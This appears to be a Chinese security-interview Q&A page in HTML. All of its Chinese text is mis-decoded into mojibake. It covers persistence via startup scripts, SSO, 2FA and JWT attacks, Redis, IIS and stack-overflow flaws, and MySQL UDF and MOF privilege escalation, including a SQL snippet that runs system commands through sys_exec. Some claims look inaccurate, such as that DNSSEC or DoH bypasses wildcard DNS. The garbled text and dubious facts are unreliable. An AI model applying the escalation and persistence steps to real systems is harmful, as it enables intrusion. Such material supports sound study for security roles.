id="Linuxå¼€æœºè‡ªå¯åŠ¨æ–‡ä»¶-etc-rc-d-rc-localã€-etc-init-d"><a href="#Linuxå¼€æœºè‡ªå¯åŠ¨æ–‡ä»¶-etc-rc-d-rc-localã€-etc-init-d" class="headerlink" title="Linuxå¼€æœºè‡ªå¯åŠ¨æ–‡ä»¶/etc/rc.d/rc.localã€/etc/init.d"></a>Linuxå¼€æœºè‡ªå¯åŠ¨æ–‡ä»¶<code>/etc/rc.d/rc.local</code>ã€<code>/etc/init.d</code></h3><p>è¿™äº›æ–‡ä»¶ç”¨äºé…ç½®ç³»ç»Ÿå¼€æœºæ—¶è‡ªåŠ¨å¯åŠ¨çš„ç¨‹åºå’ŒæœåŠ¡ã€‚æ”»å‡»è€…å¯ä»¥ä¿®æ”¹è¿™äº›æ–‡ä»¶ï¼Œæ·»åŠ æ¶æ„ç¨‹åºæˆ–åé—¨ï¼Œä»¥å®ç°æŒä¹…åŒ–æ”»å‡»ã€‚</p><h3 id="SSOç›¸å…³çš„æ”»å‡»æ–¹å¼"><a href="#SSOç›¸å…³çš„æ”»å‡»æ–¹å¼" class="headerlink" title="SSOç›¸å…³çš„æ”»å‡»æ–¹å¼"></a>SSOç›¸å…³çš„æ”»å‡»æ–¹å¼</h3><ul><li><strong>ä»¤ç‰Œçªƒå–</strong>ï¼šçªƒå–ç”¨æˆ·çš„SSOä»¤ç‰Œï¼Œå†’å……ç”¨æˆ·è¿›è¡Œè®¤è¯ã€‚</li><li><strong>é’“é±¼æ”»å‡»</strong>ï¼šé€šè¿‡ä¼ªé€ çš„SSOç™»å½•é¡µé¢è·å–ç”¨æˆ·çš„å‡­è¯ã€‚</li><li><strong>ä¸­é—´äººæ”»å‡»</strong>ï¼šåœ¨SSOè®¤è¯è¿‡ç¨‹ä¸­æ‹¦æˆªå’Œç¯¡æ”¹è®¤è¯ä¿¡æ¯ã€‚</li></ul><h3 id="æ€ä¹ˆç»•è¿‡åŠ¨æ€token"><a href="#æ€ä¹ˆç»•è¿‡åŠ¨æ€token" class="headerlink" title="æ€ä¹ˆç»•è¿‡åŠ¨æ€token"></a>æ€ä¹ˆç»•è¿‡åŠ¨æ€token</h3><ul><li><strong>ä»¤ç‰Œé¢„æµ‹</strong>ï¼šå¦‚æœåŠ¨æ€tokençš„ç”Ÿæˆç®—æ³•å­˜åœ¨æ¼æ´ï¼Œæ”»å‡»è€…å¯èƒ½é¢„æµ‹ä¸‹ä¸€ä¸ªtokenã€‚</li><li><strong>é‡æ”¾æ”»å‡»</strong>ï¼šæˆªè·tokenå¹¶åœ¨æœ‰æ•ˆæœŸå†…é‡å¤ä½¿ç”¨ã€‚</li><li><strong>æ¼æ´åˆ©ç”¨</strong>ï¼šåˆ©ç”¨ç³»ç»Ÿå¯¹tokenéªŒè¯çš„æ¼æ´ï¼Œå¦‚ä¸ä¸¥æ ¼çš„ç­¾åéªŒè¯ã€‚</li></ul><h3 id="æ€ä¹ˆç»•è¿‡åŒå› å­è®¤è¯"><a href="#æ€ä¹ˆç»•è¿‡åŒå› å­è®¤è¯" class="headerlink" title="æ€ä¹ˆç»•è¿‡åŒå› å­è®¤è¯"></a>æ€ä¹ˆç»•è¿‡åŒå› å­è®¤è¯</h3><ul><li><strong>ç¤¾ä¼šå·¥ç¨‹å­¦</strong>ï¼šè¯±éª—ç”¨æˆ·é€éœ²åŒå› å­è®¤è¯ä¿¡æ¯ã€‚</li><li><strong>ä¸­é—´äººæ”»å‡»</strong>ï¼šæ‹¦æˆªåŒå› å­è®¤è¯è¿‡ç¨‹ä¸­ä¼ è¾“çš„ä¿¡æ¯ã€‚</li><li><strong>è®¾å¤‡æ„ŸæŸ“</strong>ï¼šåœ¨ç”¨æˆ·çš„è®¾å¤‡ä¸Šå®‰è£…æ¶æ„è½¯ä»¶ï¼Œæˆªè·è®¤è¯ä¿¡æ¯ã€‚</li></ul><h3 id="åŸŸç¯å¢ƒæ€ä¹ˆæ‰“"><a href="#åŸŸç¯å¢ƒæ€ä¹ˆæ‰“" class="headerlink" title="åŸŸç¯å¢ƒæ€ä¹ˆæ‰“"></a>åŸŸç¯å¢ƒæ€ä¹ˆæ‰“</h3><ul><li><strong>æƒé™æå‡</strong>ï¼šåˆ©ç”¨åŸŸç¯å¢ƒä¸­çš„æ¼æ´è·å–æ›´é«˜æƒé™ã€‚</li><li><strong>æ¨ªå‘ç§»åŠ¨</strong>ï¼šåœ¨åŸŸå†…ä¸åŒç³»ç»Ÿé—´ç§»åŠ¨ï¼Œæ‰©å¤§æ”»å‡»èŒƒå›´ã€‚</li><li><strong>ä¿¡ä»»å…³ç³»åˆ©ç”¨</strong>ï¼šåˆ©ç”¨åŸŸé—´çš„ä¿¡ä»»å…³ç³»è¿›è¡Œæ”»å‡»ã€‚</li></ul><h3 id="IISæ–‡ä»¶è§£ææ¼æ´"><a href="#IISæ–‡ä»¶è§£ææ¼æ´" class="headerlink" title="IISæ–‡ä»¶è§£ææ¼æ´"></a>IISæ–‡ä»¶è§£ææ¼æ´</h3><ul><li><strong>è·¯å¾„æˆªæ–­</strong>ï¼šé€šè¿‡ç‰¹å®šçš„è·¯å¾„è¯·æ±‚ï¼Œä½¿IISé”™è¯¯è§£ææ–‡ä»¶ç±»å‹ã€‚</li><li><strong>æ‰©å±•ååˆ©ç”¨</strong>ï¼šåˆ©ç”¨IISå¯¹æ–‡ä»¶æ‰©å±•åè§£æçš„æ¼æ´ï¼Œæ‰§è¡Œæ¶æ„è„šæœ¬ã€‚</li><li><strong>é…ç½®é”™è¯¯</strong>ï¼šåˆ©ç”¨IISé…ç½®é”™è¯¯ï¼Œè®¿é—®æœªæˆæƒçš„èµ„æºã€‚</li></ul><h3 id="Redisæ”»å‡»æ–¹å¼"><a href="#Redisæ”»å‡»æ–¹å¼" class="headerlink" title="Redisæ”»å‡»æ–¹å¼"></a>Redisæ”»å‡»æ–¹å¼</h3><ul><li><strong>æœªæˆæƒè®¿é—®</strong>ï¼šå¦‚æœRediså®ä¾‹æ²¡æœ‰è®¾ç½®å¯†ç ï¼Œæ”»å‡»è€…å¯ä»¥ç›´æ¥è¿æ¥å¹¶æ“ä½œã€‚</li><li><strong>å¼±å¯†ç æ”»å‡»</strong>ï¼šé€šè¿‡æš´åŠ›ç ´è§£ç­‰æ–¹å¼è·å–Redisçš„è®¿é—®å¯†ç ã€‚</li><li><strong>å‘½ä»¤æ³¨å…¥</strong>ï¼šåœ¨Rediså‘½ä»¤æ‰§è¡Œè¿‡ç¨‹ä¸­æ³¨å…¥æ¶æ„å‘½ä»¤ã€‚</li></ul><h3 id="Redisä¸»ä»å¤åˆ¶æ¡ä»¶"><a href="#Redisä¸»ä»å¤åˆ¶æ¡ä»¶" class="headerlink" title="Redisä¸»ä»å¤åˆ¶æ¡ä»¶"></a>Redisä¸»ä»å¤åˆ¶æ¡ä»¶</h3><ul><li><strong>ç½‘ç»œè¿é€šæ€§</strong>ï¼šä¸»ä»Rediså®ä¾‹ä¹‹é—´éœ€è¦èƒ½å¤Ÿè¿›è¡Œç½‘ç»œé€šä¿¡ã€‚</li><li><strong>é…ç½®æ­£ç¡®</strong>ï¼šä»æœåŠ¡å™¨éœ€è¦æ­£ç¡®é…ç½®ä¸»æœåŠ¡å™¨çš„IPåœ°å€å’Œç«¯å£ã€‚</li><li><strong>æƒé™è®¾ç½®</strong>ï¼šä»æœåŠ¡å™¨éœ€è¦æœ‰æƒé™è¿æ¥åˆ°ä¸»æœåŠ¡å™¨å¹¶è¿›è¡Œæ•°æ®åŒæ­¥ã€‚</li></ul><h3 id="JWTæ”»å‡»æ–¹å¼"><a href="#JWTæ”»å‡»æ–¹å¼" class="headerlink" title="JWTæ”»å‡»æ–¹å¼"></a>JWTæ”»å‡»æ–¹å¼</h3><ul><li><strong>å¯†é’¥æ³„éœ²</strong>ï¼šå¦‚æœç”¨äºç­¾åJWTçš„å¯†é’¥æ³„éœ²ï¼Œæ”»å‡»è€…å¯ä»¥ä¼ªé€ JWTã€‚</li><li><strong>ç®—æ³•æ··æ·†</strong>ï¼šåˆ©ç”¨JWTç®—æ³•çš„æ¼æ´æˆ–ä¸æ­£ç¡®é…ç½®ï¼Œå¦‚å°†HS256æ”¹ä¸ºnoneã€‚</li><li><strong>ä¸­é—´äººæ”»å‡»</strong>ï¼šåœ¨ä¼ è¾“è¿‡ç¨‹ä¸­æˆªè·JWTå¹¶ç¯¡æ”¹ã€‚</li></ul><h3 id="æ ˆæº¢å‡ºåŸç†"><a href="#æ ˆæº¢å‡ºåŸç†" class="headerlink" title="æ ˆæº¢å‡ºåŸç†"></a>æ ˆæº¢å‡ºåŸç†</h3><p>æ ˆæº¢å‡ºæ˜¯ä¸€ç§ç¼“å†²åŒºæº¢å‡ºç±»å‹ï¼Œå‘ç”Ÿåœ¨ç¨‹åºä½¿ç”¨æ ˆæ¥å­˜å‚¨å±€éƒ¨å˜é‡æ—¶ã€‚å½“è¾“å…¥çš„æ•°æ®è¶…è¿‡ä¸ºå˜é‡åˆ†é…çš„æ ˆç©ºé—´æ—¶ï¼Œé¢å¤–çš„æ•°æ®ä¼šè¦†ç›–æ ˆä¸­çš„å…¶ä»–ä¿¡æ¯ï¼Œå¦‚è¿”å›åœ°å€ã€‚æ”»å‡»è€…å¯ä»¥åˆ©ç”¨è¿™ä¸€ç‚¹ï¼Œå°†è¿”å›åœ°å€æ›¿æ¢ä¸ºæ¶æ„ä»£ç çš„åœ°å€ï¼Œä»è€Œæ§åˆ¶ç¨‹åºçš„æ‰§è¡Œæµç¨‹ã€‚</p><h3 id="æ ˆæº¢å‡ºä¿æŠ¤æœºåˆ¶"><a href="#æ ˆæº¢å‡ºä¿æŠ¤æœºåˆ¶" class="headerlink" title="æ ˆæº¢å‡ºä¿æŠ¤æœºåˆ¶"></a>æ ˆæº¢å‡ºä¿æŠ¤æœºåˆ¶</h3><ul><li><strong>æ ˆä¿æŠ¤</strong>ï¼šç¼–è¯‘å™¨å¯ä»¥æ·»åŠ ä¿æŠ¤å­—èŠ‚ï¼ˆå¦‚<code>-fstack-protector</code>ï¼‰ï¼Œåœ¨æ ˆä¸­è®¾ç½®ä¸€ä¸ªâ€œé‡‘ä¸é›€â€å€¼ï¼Œæº¢å‡ºæ—¶ä¼šè¢«è¦†ç›–ï¼Œä»è€Œæ£€æµ‹åˆ°æº¢å‡ºã€‚</li><li><strong>NXä½</strong>ï¼šè®¾ç½®å†…å­˜åŒºåŸŸä¸ºä¸å¯æ‰§è¡Œï¼Œé˜²æ­¢åœ¨æ ˆä¸­æ‰§è¡Œæ¶æ„ä»£ç ã€‚</li><li><strong>ASLR</strong>ï¼šåœ°å€ç©ºé—´å¸ƒå±€éšæœºåŒ–ï¼Œä½¿å¾—æ”»å‡»è€…éš¾ä»¥é¢„æµ‹è¿”å›åœ°å€çš„ä½ç½®ã€‚</li></ul><h3 id="UDF-ææƒ"><a href="#UDF-ææƒ" class="headerlink" title="UDF ææƒ"></a>UDF ææƒ</h3><p><strong>å®ç°æ–¹æ³•</strong>ï¼š<br>UDFï¼ˆUser Defined Functionï¼‰ææƒæ˜¯ä¸€ç§åˆ©ç”¨MySQLçš„è‡ªå®šä¹‰å‡½æ•°åŠŸèƒ½æ¥æå‡æƒé™çš„æŠ€æœ¯ã€‚æ”»å‡»è€…é€šè¿‡ç¼–å†™å¹¶åŠ è½½æ¶æ„çš„UDFæ–‡ä»¶ï¼Œå¯ä»¥åœ¨MySQLæœåŠ¡å™¨ä¸Šæ‰§è¡Œä»»æ„ç³»ç»Ÿå‘½ä»¤ï¼Œä»è€Œæå‡æƒé™ã€‚</p><ol><li><strong>ç¼–å†™UDFæ–‡ä»¶</strong>ï¼šç¼–å†™ä¸€ä¸ªæ¶æ„çš„UDFå‡½æ•°ï¼Œä¾‹å¦‚<code>sys_exec</code>ï¼Œè¯¥å‡½æ•°èƒ½å¤Ÿæ‰§è¡Œç³»ç»Ÿå‘½ä»¤ã€‚</li><li><strong>ç¼–è¯‘UDFæ–‡ä»¶</strong>ï¼šå°†ç¼–å†™å¥½çš„UDFæ–‡ä»¶ç¼–è¯‘ä¸ºå…±äº«åº“æ–‡ä»¶ï¼ˆå¦‚<code>.so</code>æˆ–<code>.dll</code>ï¼‰ã€‚</li><li><strong>ä¸Šä¼ UDFæ–‡ä»¶</strong>ï¼šå°†ç¼–è¯‘å¥½çš„å…±äº«åº“æ–‡ä»¶ä¸Šä¼ åˆ°MySQLæœåŠ¡å™¨çš„æ’ä»¶ç›®å½•ï¼ˆå¦‚<code>/usr/lib/mysql/plugin</code>æˆ–<code>C:\Program Files\MySQL\MySQL Server 8.0\lib\plugin</code>ï¼‰ã€‚</li><li><strong>æ³¨å†ŒUDF</strong>ï¼šåœ¨MySQLä¸­æ³¨å†Œè¯¥UDFï¼Œé€šè¿‡æ‰§è¡Œ<code>CREATE FUNCTION</code>è¯­å¥ã€‚</li><li><strong>æ‰§è¡Œå‘½ä»¤</strong>ï¼šé€šè¿‡è°ƒç”¨æ³¨å†Œçš„UDFå‡½æ•°æ‰§è¡Œç³»ç»Ÿå‘½ä»¤ã€‚</li></ol><p><strong>ç¤ºä¾‹</strong>ï¼š</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">CREATE</span> <span class="keyword">FUNCTION</span> sys_exec <span class="keyword">RETURNS</span> <span class="type">INTEGER</span> SONAME <span class="string">&#x27;sys_exec.so&#x27;</span>;</span><br><span class="line"><span class="keyword">SELECT</span> sys_exec(<span class="string">&#x27;id &gt; /tmp/mysql_priv_test&#x27;</span>);</span><br></pre></td></tr></table></figure><p><strong>UDFææƒå†™å…¥æ—¶ä¹±ç æ€ä¹ˆåŠ</strong>ï¼š<br>å¦‚æœåœ¨å†™å…¥UDFæ–‡ä»¶æ—¶å‡ºç°ä¹±ç ï¼Œå¯èƒ½æ˜¯ç”±äºç¼–ç é—®é¢˜ã€‚å¯ä»¥å°è¯•ä»¥ä¸‹æ–¹æ³•è§£å†³ï¼š</p><ul><li>ç¡®ä¿æ–‡ä»¶çš„ç¼–ç æ ¼å¼æ­£ç¡®ï¼Œé€šå¸¸ä½¿ç”¨UTF-8ç¼–ç ã€‚</li><li>åœ¨ä¸Šä¼ æ–‡ä»¶æ—¶ï¼Œç¡®ä¿ä½¿ç”¨æ­£ç¡®çš„ç¼–ç æ–¹å¼ï¼Œä¾‹å¦‚ä½¿ç”¨<code>LOAD DATA INFILE</code>æˆ–<code>SELECT ... INTO DUMPFILE</code>æ—¶ï¼Œç¡®ä¿æ–‡ä»¶å†…å®¹çš„ç¼–ç æ­£ç¡®ã€‚</li></ul><p><strong>UDFéœ€è¦ä»€ä¹ˆæ¡ä»¶</strong>ï¼š</p><ul><li><strong>MySQLç‰ˆæœ¬</strong>ï¼šMySQLç‰ˆæœ¬å¤§äº5.1æ—¶ï¼ŒUDFæ–‡ä»¶å¿…é¡»æ”¾ç½®åœ¨<code>lib/plugin</code>ç›®å½•ä¸‹ï¼›ç‰ˆæœ¬å°äº5.1æ—¶ï¼Œæ–‡ä»¶éœ€è¦æ”¾ç½®åœ¨ç³»ç»Ÿç›®å½•å¦‚<code>/usr/lib</code>æˆ–<code>C:\Windows\System32</code>ã€‚</li><li><strong>æƒé™</strong>ï¼šéœ€è¦å…·æœ‰MySQLçš„<code>INSERT</code>å’Œ<code>DELETE</code>æƒé™ï¼Œä»¥åŠå¯¹æ’ä»¶ç›®å½•çš„å†™å…¥æƒé™ã€‚</li><li><strong>secure_file_priv</strong>ï¼š<code>secure_file_priv</code>çš„å€¼å¿…é¡»ä¸ºç©ºï¼Œæˆ–è€…å…è®¸å†™å…¥åˆ°æŒ‡å®šç›®å½•ã€‚</li></ul><h3 id="æœåŠ¡å™¨å¯åŠ¨é¡¹ææƒæ€ä¹ˆåšï¼Œæœ‰ä»€ä¹ˆæ–¹æ³•"><a href="#æœåŠ¡å™¨å¯åŠ¨é¡¹ææƒæ€ä¹ˆåšï¼Œæœ‰ä»€ä¹ˆæ–¹æ³•" class="headerlink" title="æœåŠ¡å™¨å¯åŠ¨é¡¹ææƒæ€ä¹ˆåšï¼Œæœ‰ä»€ä¹ˆæ–¹æ³•"></a>æœåŠ¡å™¨å¯åŠ¨é¡¹ææƒæ€ä¹ˆåšï¼Œæœ‰ä»€ä¹ˆæ–¹æ³•</h3><p><strong>æ–¹æ³•</strong>ï¼š</p><ol><li><strong>åˆ©ç”¨è®¡åˆ’ä»»åŠ¡</strong>ï¼šé€šè¿‡æ·»åŠ è®¡åˆ’ä»»åŠ¡ï¼ˆå¦‚<code>cron</code>æˆ–<code>at</code>ï¼‰æ¥æ‰§è¡Œæ¶æ„è„šæœ¬æˆ–å‘½ä»¤ã€‚</li><li><strong>ä¿®æ”¹å¯åŠ¨è„šæœ¬</strong>ï¼šä¿®æ”¹ç³»ç»Ÿçš„å¯åŠ¨è„šæœ¬ï¼ˆå¦‚<code>/etc/rc.local</code>æˆ–<code>/etc/init.d</code>ï¼‰æ¥æ‰§è¡Œæ¶æ„ä»£ç ã€‚</li><li><strong>åˆ©ç”¨æœåŠ¡</strong>ï¼šåˆ›å»ºæˆ–ä¿®æ”¹ç³»ç»ŸæœåŠ¡ï¼ˆå¦‚<code>systemd</code>æœåŠ¡ï¼‰æ¥æ‰§è¡Œæ¶æ„ä»£ç ã€‚</li></ol><h3 id="MOF-ææƒæ˜¯æ€ä¹ˆå®ç°çš„"><a href="#MOF-ææƒæ˜¯æ€ä¹ˆå®ç°çš„" class="headerlink" title="MOF ææƒæ˜¯æ€ä¹ˆå®ç°çš„"></a>MOF ææƒæ˜¯æ€ä¹ˆå®ç°çš„</h3><p><strong>å®ç°æ–¹æ³•</strong>ï¼š<br>MOFï¼ˆManaged Object Formatï¼‰ææƒæ˜¯é€šè¿‡ä¿®æ”¹WMIï¼ˆWindows Management Instrumentationï¼‰çš„MOFæ–‡ä»¶æ¥å®ç°çš„ã€‚æ”»å‡»è€…å¯ä»¥é€šè¿‡ä¿®æ”¹MOFæ–‡ä»¶æ¥æ³¨å…¥æ¶æ„ä»£ç ï¼Œä»è€Œåœ¨ç³»ç»Ÿå¯åŠ¨æ—¶æ‰§è¡Œã€‚</p><ol><li><strong>ç¼–å†™æ¶æ„MOFæ–‡ä»¶</strong>ï¼šç¼–å†™ä¸€ä¸ªæ¶æ„çš„MOFæ–‡ä»¶ï¼Œå…¶ä¸­åŒ…å«æ‰§è¡Œæ¶æ„ä»£ç çš„æŒ‡ä»¤ã€‚</li><li><strong>ä¸Šä¼ MOFæ–‡ä»¶</strong>ï¼šå°†æ¶æ„MOFæ–‡ä»¶ä¸Šä¼ åˆ°ç³»ç»Ÿçš„WMIå­˜å‚¨ç›®å½•ï¼ˆå¦‚<code>C:\Windows\System32\wbem\Repository</code>ï¼‰ã€‚</li><li><strong>è§¦å‘æ‰§è¡Œ</strong>ï¼šé€šè¿‡é‡å¯ç³»ç»Ÿæˆ–é‡æ–°å¯åŠ¨WMIæœåŠ¡æ¥è§¦å‘æ¶æ„ä»£ç çš„æ‰§è¡Œã€‚</li></ol><h3 id="Linux-æ€ä¹ˆçœ‹æ—¥å¿—ï¼Œç”¨å“ªäº›å‘½ä»¤ï¼Ÿ"><a href="#Linux-æ€ä¹ˆçœ‹æ—¥å¿—ï¼Œç”¨å“ªäº›å‘½ä»¤ï¼Ÿ" class="headerlink" title="Linux æ€ä¹ˆçœ‹æ—¥å¿—ï¼Œç”¨å“ªäº›å‘½ä»¤ï¼Ÿ"></a>Linux æ€ä¹ˆçœ‹æ—¥å¿—ï¼Œç”¨å“ªäº›å‘½ä»¤ï¼Ÿ</h3><p><strong>å‘½ä»¤</strong>ï¼š</p><ul><li><code>dmesg</code>ï¼šæŸ¥çœ‹å†…æ ¸æ—¥å¿—ã€‚</li><li><code>journalctl</code>ï¼šæŸ¥çœ‹ç³»ç»Ÿæ—¥å¿—ï¼ˆé€‚ç”¨äºä½¿ç”¨<code>systemd</code>çš„ç³»ç»Ÿï¼‰ã€‚</li><li><code>tail -f /var/log/syslog</code>ï¼šå®æ—¶æŸ¥çœ‹ç³»ç»Ÿæ—¥å¿—ã€‚</li><li><code>tail -f /var/log/auth.log</code>ï¼šæŸ¥çœ‹è®¤è¯æ—¥å¿—ã€‚</li><li><code>tail -f /var/log/apache2/access.log</code>ï¼šæŸ¥çœ‹Apacheè®¿é—®æ—¥å¿—ã€‚</li></ul><h3 id="Crontab-å®šæ—¶ä»»åŠ¡çŸ¥é“å—"><a href="#Crontab-å®šæ—¶ä»»åŠ¡çŸ¥é“å—" class="headerlink" title="Crontab å®šæ—¶ä»»åŠ¡çŸ¥é“å—"></a>Crontab å®šæ—¶ä»»åŠ¡çŸ¥é“å—</h3><p><strong>Crontab</strong> æ˜¯ä¸€ä¸ªç”¨äºç®¡ç†å®šæ—¶ä»»åŠ¡çš„å·¥å…·ï¼Œå¯ä»¥åœ¨æŒ‡å®šçš„æ—¶é—´é—´éš”è‡ªåŠ¨æ‰§è¡Œä»»åŠ¡ã€‚å¯ä»¥ä½¿ç”¨<code>crontab -e</code>å‘½ä»¤ç¼–è¾‘å®šæ—¶ä»»åŠ¡ï¼Œ<code>crontab -l</code>å‘½ä»¤æŸ¥çœ‹å½“å‰ç”¨æˆ·çš„å®šæ—¶ä»»åŠ¡ã€‚</p><h3 id="58ä¸€ä¸ªæœåŠ¡å™¨é­å—ARPæ¬ºéª—ï¼Œæ€ä¹ˆæ’æŸ¥ï¼Ÿ"><a href="#58ä¸€ä¸ªæœåŠ¡å™¨é­å—ARPæ¬ºéª—ï¼Œæ€ä¹ˆæ’æŸ¥ï¼Ÿ" class="headerlink" title="58ä¸€ä¸ªæœåŠ¡å™¨é­å—ARPæ¬ºéª—ï¼Œæ€ä¹ˆæ’æŸ¥ï¼Ÿ"></a>58ä¸€ä¸ªæœåŠ¡å™¨é­å—ARPæ¬ºéª—ï¼Œæ€ä¹ˆæ’æŸ¥ï¼Ÿ</h3><p><strong>æ’æŸ¥æ­¥éª¤</strong>ï¼š</p><ol><li><strong>æ£€æŸ¥ç½‘ç»œæµé‡</strong>ï¼šä½¿ç”¨å·¥å…·å¦‚<code>tcpdump</code>æˆ–<code>Wireshark</code>æ•è·å’Œåˆ†æç½‘ç»œæµé‡ï¼ŒæŸ¥æ‰¾å¼‚å¸¸çš„ARPæ•°æ®åŒ…ã€‚</li><li><strong>æŸ¥çœ‹ARPç¼“å­˜</strong>ï¼šä½¿ç”¨<code>arp -a</code>å‘½ä»¤æŸ¥çœ‹ç³»ç»Ÿçš„ARPç¼“å­˜ï¼Œæ£€æŸ¥æ˜¯å¦å­˜åœ¨å¼‚å¸¸çš„MACåœ°å€ç»‘å®šã€‚</li><li><strong>æ£€æŸ¥ç³»ç»Ÿæ—¥å¿—</strong>ï¼šæŸ¥çœ‹ç³»ç»Ÿæ—¥å¿—ï¼ˆå¦‚<code>/var/log/syslog</code>ï¼‰ä¸­æ˜¯å¦æœ‰ä¸ARPæ¬ºéª—ç›¸å…³çš„è®°å½•ã€‚</li><li><strong>ä½¿ç”¨å®‰å…¨å·¥å…·</strong>ï¼šä½¿ç”¨å¦‚<code>arpwatch</code>ç­‰å·¥å…·ç›‘æ§ARPæ´»åŠ¨ï¼Œæ£€æµ‹å¼‚å¸¸è¡Œä¸ºã€‚</li></ol><h3 id="æ€ä¹ˆæŸ¥çœ‹ç«¯å£å ç”¨"><a href="#æ€ä¹ˆæŸ¥çœ‹ç«¯å£å ç”¨" class="headerlink" title="æ€ä¹ˆæŸ¥çœ‹ç«¯å£å ç”¨"></a>æ€ä¹ˆæŸ¥çœ‹ç«¯å£å ç”¨</h3><p>åœ¨Linuxç³»ç»Ÿä¸­ï¼Œå¯ä»¥ä½¿ç”¨<code>lsof</code>å’Œ<code>netstat</code>å‘½ä»¤æ¥æŸ¥çœ‹ç«¯å£å ç”¨æƒ…å†µã€‚</p><ul><li><p><strong>lsofå‘½ä»¤</strong>ï¼š</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">lsof -i :ç«¯å£å·</span><br></pre></td></tr></table></figure><p>ä¾‹å¦‚ï¼ŒæŸ¥çœ‹8000ç«¯å£çš„å ç”¨æƒ…å†µï¼š</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">lsof -i :8000</span><br></pre></td></tr></table></figure></li><li><p><strong>netstatå‘½ä»¤</strong>ï¼š</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">netstat -tunlp | grep ç«¯å£å·</span><br></pre></td></tr></table></figure><p>ä¾‹å¦‚ï¼ŒæŸ¥çœ‹8000ç«¯å£çš„å ç”¨æƒ…å†µï¼š</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">netstat -tunlp | grep 8000</span><br></pre></td></tr></table></figure></li></ul><p>åœ¨Windowsç³»ç»Ÿä¸­ï¼Œå¯ä»¥ä½¿ç”¨<code>netstat</code>å’Œ<code>tasklist</code>å‘½ä»¤æ¥æŸ¥çœ‹ç«¯å£å ç”¨æƒ…å†µã€‚</p><ul><li><p><strong>netstatå‘½ä»¤</strong>ï¼š</p><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">netstat -ano | <span class="built_in">findstr</span> ç«¯å£å·</span><br></pre></td></tr></table></figure><p>ä¾‹å¦‚ï¼ŒæŸ¥çœ‹1024ç«¯å£çš„å ç”¨æƒ…å†µï¼š</p><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">netstat -ano | <span class="built_in">findstr</span> <span class="number">1024</span></span><br></pre></td></tr></table></figure></li><li><p><strong>tasklistå‘½ä»¤</strong>ï¼š</p><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">tasklist | <span class="built_in">findstr</span> PID</span><br></pre></td></tr></table></figure><p>ä¾‹å¦‚ï¼ŒæŸ¥çœ‹PIDä¸º808çš„è¿›ç¨‹ï¼š</p><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">tasklist | <span class="built_in">findstr</span> <span class="number">808</span></span><br></pre></td></tr></table></figure></li></ul><h3 id="ä¸€å¼ æ•°æ®åº“è¡¨æœ€å¤šå­˜å¤šå°‘æ¡è®°å½•"><a href="#ä¸€å¼ æ•°æ®åº“è¡¨æœ€å¤šå­˜å¤šå°‘æ¡è®°å½•" class="headerlink" title="ä¸€å¼ æ•°æ®åº“è¡¨æœ€å¤šå­˜å¤šå°‘æ¡è®°å½•"></a>ä¸€å¼ æ•°æ®åº“è¡¨æœ€å¤šå­˜å¤šå°‘æ¡è®°å½•</h3><p>å¯¹äºAccessæ•°æ®åº“ï¼Œå•ä¸ªè¡¨çš„è®°å½•æ•°é™åˆ¶ä¸º2^32-1ï¼Œå³4294967295æ¡è®°å½•ã€‚ç„¶è€Œï¼Œç”±äºAccessæ•°æ®åº“çš„å¤§å°é™åˆ¶ä¸º2GBï¼Œå®é™…å¯å­˜å‚¨çš„è®°å½•æ•°é€šå¸¸åœ¨2000ä¸‡æ¡å·¦å³ã€‚<br>å¯¹äºSQL Serverï¼Œæ•°æ®è¡¨çš„æœ€å¤§è®°å½•æ•°å–å†³äºæ•°æ®åº“çš„å®¹é‡ï¼Œç†è®ºä¸Šå¯ä»¥å­˜å‚¨éå¸¸å¤§çš„è®°å½•æ•°ï¼Œæœ€å¤§å¯è¾¾5,242,720,000,000,000æ¡è®°å½•ã€‚</p><h3 id="é‡åˆ°å­åŸŸåæ³›è§£ææ€ä¹ˆåŠ"><a href="#é‡åˆ°å­åŸŸåæ³›è§£ææ€ä¹ˆåŠ" class="headerlink" title="é‡åˆ°å­åŸŸåæ³›è§£ææ€ä¹ˆåŠ"></a>é‡åˆ°å­åŸŸåæ³›è§£ææ€ä¹ˆåŠ</h3><p>å­åŸŸåæ³›è§£ææ˜¯ä¸€ç§DNSé…ç½®ï¼Œå…è®¸å°†æ‰€æœ‰æœªæ˜ç¡®è§£æçš„å­åŸŸåè§£æåˆ°ä¸€ä¸ªç‰¹å®šçš„IPåœ°å€ã€‚å¦‚æœé‡åˆ°å­åŸŸåæ³›è§£æï¼Œå¯ä»¥é‡‡å–ä»¥ä¸‹æªæ–½ï¼š</p><ul><li><strong>åˆ©ç”¨æ³›è§£æè¿›è¡Œä¿¡æ¯æ”¶é›†</strong>ï¼šé€šè¿‡æ„é€ ä¸åŒçš„å­åŸŸåï¼Œå°è¯•è®¿é—®å¯èƒ½å­˜åœ¨çš„æœåŠ¡æˆ–åº”ç”¨ã€‚</li><li><strong>ç»•è¿‡æ³›è§£æé™åˆ¶</strong>ï¼šé€šè¿‡ç‰¹å®šçš„DNSæŸ¥è¯¢æŠ€æœ¯ï¼Œå¦‚DNSSECæˆ–DNS over HTTPSï¼Œç»•è¿‡æ³›è§£æçš„é™åˆ¶ã€‚</li><li><strong>ç»“åˆå…¶ä»–æ¼æ´åˆ©ç”¨</strong>ï¼šåˆ©ç”¨æ³›è§£æç»“åˆå…¶ä»–æ¼æ´ï¼Œå¦‚SQLæ³¨å…¥ã€æ–‡ä»¶åŒ…å«ç­‰ï¼Œè¿›è¡Œæ›´æ·±å…¥çš„æ¸—é€ã€‚</li></ul><h3 id="å†…ç½‘æ¸—é€æ¨ªå‘æ‰‹æ®µï¼Œ135ã€445ç«¯å£"><a 